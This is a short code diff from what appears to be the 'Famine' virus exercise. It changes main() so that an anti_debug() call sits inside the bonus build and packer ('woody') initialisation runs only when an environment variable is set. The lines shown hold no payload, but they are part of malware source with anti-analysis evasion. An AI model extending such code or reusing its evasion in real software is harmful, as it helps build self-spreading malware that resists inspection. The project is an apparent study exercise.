@@ -78,21 +78,32 @@ void famine_main(void *input, int woody_init_ok) {
 }
 
 int main(int argc, char **argv) {
-    // set_log_level(L_DEBUG);
     set_log_level(L_DEBUG);
-    anti_debug();
 
     (void)argc, (void)argv;
 
+
     #ifdef FAMINE_BONUS
         UserInput	input = {0};
-        int         woody_init_ok = TRUE;
+        int         woody_init_ok = FALSE;
         int 		ret = 0;
-	    input.key_len = KEY_LEN;
-		ret = woody_bonus_init(argv, &input, argc);
-		if (!ret) {
-            woody_init_ok = FALSE;
+	    
+        anti_debug();
+
+        input.key_len = KEY_LEN;
+		char *woody_enable = getenv("FAMINE_WOODY_ENABLE");
+        char *lower_woody_enable = NULL;
+        if (woody_enable) {
+            lower_woody_enable = str_tolower(woody_enable);
+            if (ft_strcmp(lower_woody_enable, "true") == 0) {
+                ret = woody_bonus_init(argv, &input, argc);
+                if (ret != 0) {
+                    INFO(GREEN "Woody bonus ENABLED, initialization successful.\n" RESET);
+                    woody_init_ok = TRUE;
+                } 
+            }
         }
+
         famine_main(&input, woody_init_ok);
         input_destroy(&input);
     #else
